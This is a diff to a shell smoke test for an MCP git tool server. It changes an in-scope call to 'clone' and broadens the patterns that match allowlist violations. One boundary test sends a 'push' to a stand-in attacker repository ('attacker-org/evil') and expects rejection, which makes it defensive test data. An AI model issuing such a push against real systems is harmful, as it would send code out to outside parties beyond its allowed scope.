@@ -136,10 +136,10 @@ done
 echo "$RESP" | grep -q '\[UNSAFE\]' || fail T3 "unsafe escape hatch not flagged" 44
 
 # tools/call — SHAPE MCP REAL ENVELOPE (PAT-KVD-004 critical)
-send '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"kvendra.git","arguments":{"profile_id":"smoke-git-readonly","operation":"read_metadata","args":{"repo":"github.com/KvendraAI/kvendra-cli"}}}}'
+send '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"kvendra.git","arguments":{"profile_id":"smoke-git-readonly","operation":"clone","args":{"repo":"github.com/KvendraAI/kvendra-cli"}}}}'
 RESP="$(recv)"
 echo "$RESP" | grep -q '"id":3' || fail T3 "tools/call id mismatch" 45
-if echo "$RESP" | grep -qi 'AllowlistViolation'; then
+if echo "$RESP" | grep -qiE 'allowlist[ _]?violation'; then
   fail T3 "false-positive AllowlistViolation on in-scope call (PAT-KVD-004 RECURRENCE?)" 46
 fi
 
@@ -147,7 +147,7 @@ fi
 phase D "boundary — out-of-scope must reject AllowlistViolation"
 send '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"kvendra.git","arguments":{"profile_id":"smoke-git-readonly","operation":"push","args":{"repo":"github.com/attacker-org/evil","ref":"refs/heads/main"}}}}'
 RESP="$(recv)"
-echo "$RESP" | grep -qi 'AllowlistViolation\|not allowed\|out of scope' \
+echo "$RESP" | grep -qiE 'allowlist[ _]?violation|not allowed|out of scope' \
   || fail D "out-of-scope did NOT trigger AllowlistViolation (PAT-KVD-004 RECURRENCE?)" 50
 echo "$RESP" | grep -q '"id":4' || fail D "boundary response id mismatch" 51
 
